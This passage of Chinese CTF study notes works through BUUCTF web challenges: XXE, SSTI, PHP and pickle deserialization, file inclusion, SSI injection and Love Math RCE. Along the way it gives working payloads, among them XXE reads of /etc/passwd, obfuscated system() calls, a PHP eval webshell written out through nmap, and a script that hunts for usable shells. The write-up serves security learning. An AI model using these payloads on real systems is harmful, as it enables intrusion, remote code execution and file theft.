($this-&gt;func !&#x3D; &quot;&quot;) &#123; echo gettime($this-&gt;func, $this-&gt;p); &#125; &#125; &#125; $func &#x3D; $_REQUEST[&quot;func&quot;]; $p &#x3D; $_REQUEST[&quot;p&quot;]; if ($func !&#x3D; null) &#123; $func &#x3D; strtolower($func); if (!in_array($func,$disable_fun)) &#123; echo gettime($func, $p); &#125;else &#123; die(&quot;Hacker...&quot;); &#125; &#125; ?&gt; 由于这个过滤不存在于test中，所以可以利用反序列化来执行命令 利用find命令来查找文件名中有flag的文件 最后用file_get_contents来查看文件 [NCTF2019]Fake XML cookbook看到这题目第一眼就感觉是xxe漏洞，正好趁这个机会把xml学一下 从XML相关一步一步到XXE漏洞 - 先知社区 (aliyun.com) NCTF2019]Fake XML cookbook_sgnbi~的博客-CSDN博客 浅谈XML实体注入漏洞 - FreeBuf网络安全行业门户 - XML被设计为传输和存储数据，其焦点是数据的内容。 - HTML被设计用来显示数据，其焦点是数据的外观。 基本语法： - 所有 XML 元素都须有关闭标签。 - XML 标签对大小写敏感。 - XML 必须正确地嵌套。 - XML 文档必须有根元素。 - XML 的属性值须加引号。 - 实体引用，如果你把字符 &quot;&lt;&quot; 放在 XML元素中，会发生错误，这是因为解析器会把它当作新元素的开始。这样会产生XML错误： &lt;bookstore> &lt;!--根元素--> &lt;book category=\"COOKING\"> &lt;!--bookstore的子元素，category为属性--> &lt;title>Everyday Italian&lt;/title> &lt;!--book的子元素，lang为属性--> &lt;author>Giada De Laurentiis&lt;/author> &lt;!--book的子元素--> &lt;year>2005&lt;/year> &lt;!--book的子元素--> &lt;price>30.00&lt;/price> &lt;!--book的子元素--> &lt;/book> &lt;!--book的结束--> &lt;/bookstore> &lt;!--bookstore的结束--> DTD 文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行地声明于XML文档中，也可作为一个外部引用。带有DTD的XML文档实例 &lt;?xml version&#x3D;&quot;1.0&quot;?&gt; &lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt; &lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt; &lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt; &lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt; &lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt; &lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt; ]&gt; &lt;note&gt; &lt;to&gt;Y0u&lt;&#x2F;to&gt; &lt;from&gt;@re&lt;&#x2F;from&gt; &lt;head&gt;v3ry&lt;&#x2F;head&gt; &lt;body&gt;g00d!&lt;&#x2F;body&gt; &lt;&#x2F;note&gt; 当使用外部DTD时，通过如下语法引入。 &lt;!DOCTYPE root-element SYSTEM \"filename\"> 外部DTD实例 &lt;?xml version=\"1.0\"?> &lt;!DOCTYPE root-element SYSTEM \"test.dtd\"> &lt;note> &lt;to>Y0u&lt;/to> &lt;from>@re&lt;/from> &lt;head>v3ry&lt;/head> &lt;body>g00d!&lt;/body> &lt;/note> test.dtd： &lt;!ELEMENT to (#PCDATA)>&lt;!--定义to元素为”#PCDATA”类型--> &lt;!ELEMENT from (#PCDATA)>&lt;!--定义from元素为”#PCDATA”类型--> &lt;!ELEMENT head (#PCDATA)>&lt;!--定义head元素为”#PCDATA”类型--> &lt;!ELEMENT body (#PCDATA)>&lt;!--定义body元素为”#PCDATA”类型--> PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。 内部实体示例代码 &lt;?xml version &#x3D; &quot;1.0&quot; encoding &#x3D; &quot;utf-8&quot;?&gt; &lt;!DOCTYPE test [ &lt;!ENTITY writer &quot;Dawn&quot;&gt; &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt; ]&gt; &lt;test&gt;&amp;writer;©right;&lt;&#x2F;test&gt; 外部实体示例代码 &lt;?xml version &#x3D; &quot;1.0&quot; encoding &#x3D; &quot;utf-8&quot;?&gt; &lt;!DOCTYPE test [ &lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; &lt;!ENTITY copyright SYSTEM &quot;http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;dtd&#x2F;entities.dtd&quot;&gt; ]&gt; &lt;author&gt;&amp;file;©right;&lt;&#x2F;author&gt; XXE漏洞简介 XXE漏洞全称XML External Entity Injection 即XML外部实体注入。XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 通过各种协议可以实现xxe注入，例如利用file://来访问本地文件系统 解析xml在php库libxml，libxml&gt;=2.9.0的版本中没有XXE漏洞。simplexml_load_string()可以读取XML 简单的payload &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE a [ &lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; ]&gt; &lt;xml&gt; &lt;xxe&gt;&amp;file;&lt;&#x2F;xxe&gt; &lt;&#x2F;xml&gt; &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE note [ &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt; ]&gt; &lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt; 题解： 抓包，能看出是用xml进行传输数据 直接上payload &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE note [ &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt; ]&gt; &lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt; [BSidesCF 2020]Had a bad day看这个url，试试伪协议读取 多了个php 所以可以用这个来读源码?category=php://filter/read=convert.base64-encode/resource=index base64解码后的重点 &lt;?php $file &#x3D; $_GET[&#39;category&#39;]; if(isset($file)) &#123; if( strpos( $file, &quot;woofers&quot; ) !&#x3D;&#x3D; false || strpos( $file, &quot;meowers&quot; ) !&#x3D;&#x3D; false || strpos( $file, &quot;index&quot;))&#123; include ($file . &#39;.php&#39;); &#125; else&#123; echo &quot;Sorry, we currently only support woofers and meowers.&quot;; &#125; &#125; ?&gt; 存在flag.php页面，之后就是想办法把他读出来 接下来有一个 php伪协议嵌套的知识点 PHP伪协议可以将某个文件或文件夹包含在php://filter/convert.base64-encode/resource=flag中。比如：php://filter/convert.base64-encode/index/resource=flag 这样就能绕过if的判断，读取flag文件 [ASIS 2019]Unicorn shop 输入id和价格，应该是购买独角兽，而且price只允许输入一位数，前三个买的时候都显示 但是因为price的输入限制，所以我猜这里应该是要想办法购买第四个独角兽 这里要利用Unicode的编码，查找一个大于1337的字符 https://www.compart.com/en/unicode/ 比如这个 成功拿到flag [BJDCTF2020]Cookie is so stable 看一眼hint flag页面的登录框 这里存在ssti注入 可以试出来是twig模板，根据提示注入点应该在cookie里，抓包 通过修改user内容实现注入 一篇文章带你理解漏洞之 SSTI 漏洞 | K0rz3n&#39;s Blog 这里是twig1.x版本才有的模板注入，在2.x和3.x版本__self 变量在 SSTI 中早已失去了他的作用，这之后主要通过过滤器来实现攻击https://xz.aliyun.com/t/10056#toc-14 ssti还是不太懂，毕竟我python还是没学会，遇到ssti的题我只能直接找payload，先放在这，等刷完buu第二页题目之后再回头看一遍 [De1CTF 2019]SSRF Me题目源码 #! &#x2F;usr&#x2F;bin&#x2F;env python # #encoding&#x3D;utf-8 from flask import Flask from flask import request import socket import hashlib import urllib import sys import os import json reload(sys) sys.setdefaultencoding(&#39;latin1&#39;) app &#x3D; Flask(__name__) secert_key &#x3D; os.urandom(16) class Task: def __init__(self, action, param, sign, ip): self.action &#x3D; action self.param &#x3D; param self.sign &#x3D; sign self.sandbox &#x3D; md5(ip) if(not os.path.exists(self.sandbox)): os.mkdir(self.sandbox) def Exec(self): result &#x3D; &#123;&#125; result[&#39;code&#39;] &#x3D; 500 if (self.checkSign()): if &quot;scan&quot; in self.action: tmpfile &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;w&#39;) resp &#x3D; scan(self.param) if (resp &#x3D;&#x3D; &quot;Connection Timeout&quot;): result[&#39;data&#39;] &#x3D; resp else: print resp tmpfile.write(resp) tmpfile.close() result[&#39;code&#39;] &#x3D; 200 if &quot;read&quot; in self.action: f &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;r&#39;) result[&#39;code&#39;] &#x3D; 200 result[&#39;data&#39;] &#x3D; f.read() if result[&#39;code&#39;] &#x3D;&#x3D; 500: result[&#39;data&#39;] &#x3D; &quot;Action Error&quot; else: result[&#39;code&#39;] &#x3D; 500 result[&#39;msg&#39;] &#x3D; &quot;Sign Error&quot; return result def checkSign(self): if (getSign(self.action, self.param) &#x3D;&#x3D; self.sign): return True else: return False @app.route(&quot;&#x2F;geneSign&quot;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;]) def geneSign(): param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action &#x3D; &quot;scan&quot; return getSign(action, param) @app.route(&#39;&#x2F;De1ta&#39;,methods&#x3D;[&#39;GET&#39;,&#39;POST&#39;]) def challenge(): action &#x3D; urllib.unquote(request.cookies.get(&quot;action&quot;)) param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) sign &#x3D; urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip &#x3D; request.remote_addr if(waf(param)): return &quot;No Hacker!!!!&quot; task &#x3D; Task(action, param, sign, ip) return json.dumps(task.Exec()) @app.route(&#39;&#x2F;&#39;) def index(): return open(&quot;code.txt&quot;,&quot;r&quot;).read() def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return &quot;Connection Timeout&quot; def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() def md5(content): return hashlib.md5(content).hexdigest() def waf(param): check&#x3D;param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return False if __name__ &#x3D;&#x3D; &#39;__main__&#39;: app.debug &#x3D; False app.run(host&#x3D;&#39;0.0.0.0&#39;,port&#x3D;9999) Flask框架，先看路由，geneSign是对传入的param与其他字符串拼接并返回其md5值，De1ta是主要，传入3个参数，以及ip，先判断param是否是gopher或者file开头的参数，不是则过到Task中，并且返回task的Exec()函数结果，另外hint给出提示在flag.txt中有flag 1：&#x2F;geneSign：获得url中parma参数，通过getSign(action, param)生成摘要 2：&#x2F;De1ta：获得cookie中的action和sign，waf(param),创建task对象，调用exce()方法，json格式返回 3：&#x2F;：返回源码 三个函数 def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() def md5(content): return hashlib.md5(content).hexdigest() def waf(param): check&#x3D;param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return False getSign：返回secert_key + param + action的哈希值md5：返回content的哈希值waf：禁止了flie和gopher协议 task类 class Task: def __init__(self, action, param, sign, ip): self.action &#x3D; action self.param &#x3D; param self.sign &#x3D; sign self.sandbox &#x3D; md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result &#x3D; &#123;&#125; result[&#39;code&#39;] &#x3D; 500 if (self.checkSign()): if &quot;scan&quot; in self.action: tmpfile &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;w&#39;) resp &#x3D; scan(self.param) if (resp &#x3D;&#x3D; &quot;Connection Timeout&quot;): result[&#39;data&#39;] &#x3D; resp else: print resp tmpfile.write(resp) tmpfile.close() result[&#39;code&#39;] &#x3D; 200 if &quot;read&quot; in self.action: f &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;r&#39;) result[&#39;code&#39;] &#x3D; 200 result[&#39;data&#39;] &#x3D; f.read() if result[&#39;code&#39;] &#x3D;&#x3D; 500: result[&#39;data&#39;] &#x3D; &quot;Action Error&quot; else: result[&#39;code&#39;] &#x3D; 500 result[&#39;msg&#39;] &#x3D; &quot;Sign Error&quot; return result def checkSign(self): if (getSign(self.action, self.param) &#x3D;&#x3D; self.sign): return True else: return False checkSign：检查cookie中的signExec：检查cookie中的action，如果scan在action中，将param的文件内容写入result.txt，如果read在action中，读出result.txt 的内容 hint提示flag在flag.txt 中，想要读到他首先：action=scan，param=flag.txt ，将flag.txt的内容读到result.txt中然后：action=read，将result.txt的内容读出 绕过点：signcheckSign会检查cookie中的sign==getSign（param，action）两个困难点：secert_key的值未知 思路：先进入/De1ta中的challenge函数，在Exec中的scan部分中将flag.txt的内容存入result.txt，然后从read部分中将其存到result字典中读出，再以json形式返回到客户端，我们就能得到flag。 写入与读出部分 而如果action中既有scan,又有read,那么就会依次执行scan和read 而为了绕过这个验证，就要利用 让param = flag.txtread 因为action为scan 所以得到的md5值为keyflag.txtreadscan 满足action=readscan param=flag.txt时的值 解题 ​ 首先进入genesign页面得到md5(keyflag.txtreadscan)的值作为sign 在到de1ta界面抓包get进param=flag.php，在cookie内加入sign和action [CISCN 2019 初赛]Love Math源码 &lt;?php error_reporting(0); &#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flag if(!isset($_GET[&#39;c&#39;]))&#123; show_source(__FILE__); &#125;else&#123; &#x2F;&#x2F;例子 c&#x3D;20-1 $content &#x3D; $_GET[&#39;c&#39;]; if (strlen($content) &gt;&#x3D; 80) &#123; die(&quot;太长了不会算&quot;); &#125; $blacklist &#x3D; [&#39; &#39;, &#39;\\t&#39;, &#39;\\r&#39;, &#39;\\n&#39;,&#39;\\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\\[&#39;, &#39;\\]&#39;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123; die(&quot;请不要输入奇奇怪怪的字符&quot;); &#125; &#125; &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;]; preg_match_all(&#39;&#x2F;[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*&#x2F;&#39;, $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(&quot;请不要输入奇奇怪怪的函数&quot;); &#125; &#125; &#x2F;&#x2F;帮你算出答案 eval(&#39;echo &#39;.$content.&#39;;&#39;); &#125; payload： $pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;tac flag.php 或 $pi&#x3D;base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;) ($pi&#x3D;base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898))) 或 base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi)) CISCN 2019 初赛]Love Math - MustaphaMond - 博客园 (cnblogs.com) CISCN 2019 初赛]Love Math_羽的博客-CSDN博客 CISCN 2019 初赛]Love Math_分享简单的安全技术-CSDN博客 [WUSTCTF2020]朴实无华 level1 intval() 函数用于获取变量的整数值。 测试： &lt;?php $a &#x3D; &#39;2e4&#39;; var_dump($a); var_dump(intval($a)); $b &#x3D; $a + 1; echo $b.&quot;\\n&quot;; var_dump($b); var_dump(intval($b)); 输出 string(3) &quot;2e4&quot; int(2) 20001 float(20001) int(20001) level2 php弱比较，php会将以0x开头的字符串，当进行==弱比较时，会认为是相同的。 所以就变成了找到一个以0e开头的字符串s,并且smd5(s)也是以0e开头的字符串。 0e215962017 level3 **$IFS$9**替代空格，用其他的查看文件命令代替cat payload： ？num&#x3D;1e10&amp;md5&#x3D;0e215962017&amp;get_flag&#x3D;more$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag [WesternCTF2018]shrine import flask import os app &#x3D; flask.Flask(__name__) app.config[&#39;FLAG&#39;] &#x3D; os.environ.pop(&#39;FLAG&#39;)&#x2F;&#x2F;注册了一个名为FLAG的config，这里基本可以确定是flag。 @app.route(&#39;&#x2F;&#39;) def index(): return open(__file__).read() @app.route(&#39;&#x2F;shrine&#x2F;&lt;path:shrine&gt;&#39;) def shrine(shrine): def safe_jinja(s): s &#x3D; s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;) blacklist &#x3D; [&#39;config&#39;, &#39;self&#39;]&#x2F;&#x2F;设置黑名单 return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;&#x3D;None%&#125;&#125;&#39;.format(c) for c in blacklist]) + s&#x2F;&#x2F;把黑名单内的内容置空 return flask.render_template_string(safe_jinja(shrine)) if __name__ &#x3D;&#x3D; &#39;__main__&#39;: app.run(debug&#x3D;True) ssti注入，先试一个&#123;&#123;7*7&#125;&#125; 接下来就可以考虑在shrine下直接&#123;&#123;config&#125;&#125;即可查看所有app.config内容，但是这题设了黑名单[&#39;config&#39;,&#39;self&#39;]并且过滤了括号，但是python还有一个函数叫做url_for，其作用是url是用于构建指定函数的URL，再配合globals，该函数会以字典类型返回当前位置的全部全局变量。这样也可以实现查看的效果 current_app意思应该是当前app，那我们就当前app下的config： 于是可以读到flag &#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125; 也可以用 get_flashed_messages 返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。 get_flashed_messages.__globals__[&#39;current_app&#39;].config [MRCTF2020]PYWebsite进去后看源码，有一段js脚本 试了一下这个md5，能解出来但是是付费记录 所以直接看flag.php “除了购买者和我自己” 那就试试127.0.0.1本地访问 [NPUCTF2020]ReadlezPHP 跳到time.php?source界面看看内容 反序列化构造实现命令执行 eval这里应该是过滤了，可以用assert代替 assert()简介：判断一个表达式是否成立。返回true or false。 当参数为字符串时，会被当作php代码执行。 例如 assert(&quot;phpinfo()&quot;) &lt;&#x3D;&#x3D;&gt; &lt;?phpinfo()?&gt; assert与eval的区别 assert把整个字符串参数当php代码执行，eval把合法的php代码执行。 payload：?data=O:8:&quot;HelloPhp&quot;:2:{s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;} 或者?data=O:8:&quot;HelloPhp&quot;:2:{s:1:&quot;a&quot;;s:16:&quot;eval($_POST[a]);&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;}然后post：a=phpinfo 搜索flag就能找到 [CISCN2019 华东南赛区]Web11xff头的ssti注入，我好像之前做过一个差不多的 界面右上角ip可随意改变，因此可以利用readfile函数读flag [BJDCTF2020]EasySearch扫目录，发现index.php.swp界面 要让password前六位md5值为6d0bc1 爆破一下 登录后抓包 这里可以看见一个shtml页面 进入后的页面 这里admin的位置是我们的用户名，这里利用了ssl注入 SSI注入漏洞_Hydra的博客-CSDN博客_ssi注入 （shtml是一种基于SSI技术的文件。SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。IIS和Apache都可以开启SSI功能） （SSI注入的条件： 1.Web 服务器已支持SSI（服务器端包含） 2.Web 应用程序未对对相关SSI关键字做过滤 3.Web 应用程序在返回响应的HTML页面时，嵌入用户输入） 模板就类似于 &lt;!--#exec cmd=&quot;文件名称&quot;--&gt; 可以先用ls查看目录找到flag文件，再利用cat查看 访问页面找到flag [BSidesCF 2019]Futurellaf12源码里有flag 好久没做这么简单的了 [网鼎杯 2020 朱雀组]Nmap常见的nmap命令 nmap linux 命令 在线中文手册 (51yip.com) 选项 解释-oN 标准保存-oX XML保存-oG Grep保存-oA 保存到所有格式-append-output 补充保存文件选项-oG将结果Grep保存。 nmap -F -oG test.txt 192.168.23.11选项-oA该选项可将扫描结果以标准格式、XML格式和Grep格式一次性保存，分别放在.nmap，.xml和.gnmap文件中。 nmap -F -oA test 192.168.3.2 这里就是要用nmap的 -oN命令写shell &#39; -oN w4ke.txt &#39; 返回host maybe down之后访问w4ke.txt 所以可以试试写个一句话木马上去 &#39; -oN b.phtml &lt;?php eval($_POST[&#39;a&#39;]); ?&gt;&#39; 返回了hacker，所以应该是有东西被过滤了 试了一下发现是php被过滤了 可以用其他的进行替代 &lt;?&#x3D;eval($_POST[a]);?&gt; 利用post传参执行命令 参考链接 网鼎杯 2020 朱雀组]Nmap_浩歌已行的博客-CSDN博客 网鼎杯 2020 朱雀组]Nmap (icode9.com) [强网杯 2019]高明的黑客根据题目提示下载压缩包文件，里面存在三千多个php文件 每一个文件里都有shell，我们要找到一个能用的 import requests import os import re url &#x3D; &#39;http:&#x2F;&#x2F;22ffcd5e-b2cc-48c3-b7b7-4ba7bcc7d244.node4.buuoj.cn:81&#x2F;&#39; path &#x3D; r&#39;C:\\Users\\ethe\\Desktop\\www\\src&#39; ptn_get &#x3D; re.compile(br&quot;\\$_GET\\[&#39;(\\w+)&#39;\\]&quot;) ptn_res &#x3D; re.compile(br&#39;success_hack&#39;) count &#x3D; 0 for f in list(os.scandir(path)): print(str(f)[11:-2]) count +&#x3D; 1 with open(f.path, &#39;rb&#39;) as fp: data &#x3D; fp.read() for get in set(ptn_get.findall(data)): get &#x3D; get.decode(&#39;utf-8&#39;) cmd &#x3D; &#39;echo &quot;success_hack&quot;;&#39; r &#x3D; requests.get(url + f.name, params&#x3D;&#123;get: cmd&#125;) if ptn_res.search(r.content) is not None: print(f.name, get) exit() [NCTF2019]True XML cookbook题目提示xml，抓包后 猜应该是有xxe注入，直接上payload，发现没读取成功 看一看dologin.php的源码 &lt;?php &#x2F;** * autor: c0ny1 * date: 2018-2-7 *&#x2F; $USERNAME &#x3D; &#39;admin&#39;; &#x2F;&#x2F;è´¦å· $PASSWORD &#x3D; &#39;024b87931a03f738fff6693ce0a78c88&#39;; &#x2F;&#x2F;å¯ç  $result &#x3D; null; libxml_disable_entity_loader(false); $xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;); try&#123; $dom &#x3D; new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds &#x3D; simplexml_import_dom($dom); $username &#x3D; $creds-&gt;username; $password &#x3D; $creds-&gt;password; if($username &#x3D;&#x3D; $USERNAME &amp;&amp; $password &#x3D;&#x3D; $PASSWORD)&#123; $result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,1,$username); &#125;else&#123; $result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,0,$username); &#125; &#125;catch(Exception $e)&#123; $result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,3,$e-&gt;getMessage()); &#125; header(&#39;Content-Type: text&#x2F;html; charset&#x3D;utf-8&#39;); echo $result; ?&gt; 但是从这个源码里也找不到flag 还有一个知识xxe可以内网探测存活的主机，获取/etc/hosts文件，我们分别读取关键文件：**/etc/hosts 和 /proc/net/arp** 访问proc/net/arp文件查看有无可利用内网主机 尝试访问一下这个ip，报错 之后c段扫描，找到flag 总的来说，主机上面没有flag，需要去看hosts文件看看内网的主机是否有flag [CISCN2019 华北赛区 Day1 Web2]ikun这题感觉有点问题 写脚本找lv6 找到后 很明显钱不够 这里可以抓包改折扣，当折扣足够小的时候就出现一个重定向 接下来的步骤感觉就有点问题了，当直接在burp改路径的时候会直接跳过一个cookie的修改变成admin 但是直接在url栏修改会要求用户是admin 这就要求修改jwt的cookie 认识JWT - 废物大师兄 - 博客园 (cnblogs.com) 这里的c-jwt-crack工具不会用，所以就跳过这部分吧 看登录后的源码看见www.zip路径 下载压缩包后发现全为python文件 这里是利用了python反编译 pickle提供了一个简单的持久化功能。可以将对象以文件的形式存放在磁盘上。 pickle模块只能在python中使用，python中几乎所有的数据类型（列表，字典，集合，类等）都可以用pickle来序列化，pickle序列化后的数据，可读性差，人一般无法识别。 p = pickle.loads(urllib.unquote(become)) urllib.unquote:将存入的字典参数编码为URL查询字符串，即转换成以key1 = value1 &amp; key2 = value2的形式pickle.loads(bytes_object): 从字节对象中读取被封装的对象，并返回我看了师傅们的博客之后的理解就是，我们构建一个类，类里面的__reduce__python魔术方法会在该类被反序列化的时候会被调用Pickle模块中最常用的函数为： （1）pickle.dump(obj, file, [,protocol]) 函数的功能：将obj对象序列化存入已经打开的file中。 参数讲解： obj：想要序列化的obj对象。 file:文件名称。 protocol：序列化使用的协议。如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。 （2）pickle.load(file) 函数的功能：将file中的对象序列化读出。 参数讲解： file：文件名称。 （3）pickle.dumps(obj[, protocol]) 函数的功能：将obj对象序列化为string形式，而不是存入文件中。 参数讲解： obj：想要序列化的obj对象。 protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。 （4）pickle.loads(string) 函数的功能：从string中读出序列化前的obj对象。 参数讲解： string：文件名称。 【注】 dump() 与 load() 相比 dumps() 和 loads() 还有另一种能力：dump()函数能一个接着一个地将几个对象序列化存储到同一个文件中，随后调用load()来以同样的顺序反序列化读出这些对象。而在__reduce__方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码 检测反序列化方法： 全局搜索Python代码中是否含有关键字类似“import cPickle”或“import pickle”等，若存在则进一步确认是否调用cPickle.loads()或pickle.loads()且反序列化的参数可控。 防御方法 1、用更高级的接口__getnewargs()、__getstate__()、__setstate__()等代替__reduce__()魔术方法； 2、进行反序列化操作之前，进行严格的过滤，若采用的是pickle库可采用装饰器实现。 这里采用reduce 当__reduce__被定义之后，该对象被Pickle时就会被调用我们这里的eval用于重建对象的时候调用，即告诉python如何pickle他们供eval使用的即打开的文件flag.txt其他的参数我们可以不填 百度个脚本 把这个值给become里放包就行 参考链接 Python魔法方法指南_宇宙浪子的专栏-CSDN博客 Python反序列化漏洞的花式利用 - 先知社区 (aliyun.com) 几天之后的补，jwt那个工具环境弄好了 [MRCTF2020]套娃才发现这就是寒假那个招新赛的原题 下划线可以用.来绕过，第二个if可以利用%0a换行绕过 要求本地登录 抓包改xff 里面有一段js代码 post一个merak值，得到一段代码 代码审计 要求get进一个值且存在一个文件名为这个值的文件，内容为todat is a happy day 可以用data://text/plain,绕过 也可以用data://text/plain;base64, 然后存在一个file_get_contents读取传入的file 要让这个值经过change函数后为flag.php 传进去，拿flag [极客大挑战 2019]RCE ME&lt;?php error_reporting(0); if(isset($_GET[&#39;code&#39;]))&#123; $code&#x3D;$_GET[&#39;code&#39;]; if(strlen($code)&gt;40)&#123; die(&quot;This is too Long.&quot;); &#125; if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123; die(&quot;NO.&quot;); &#125; @eval($code); &#125; else&#123; highlight_file(__FILE__); &#125; &#x2F;&#x2F; 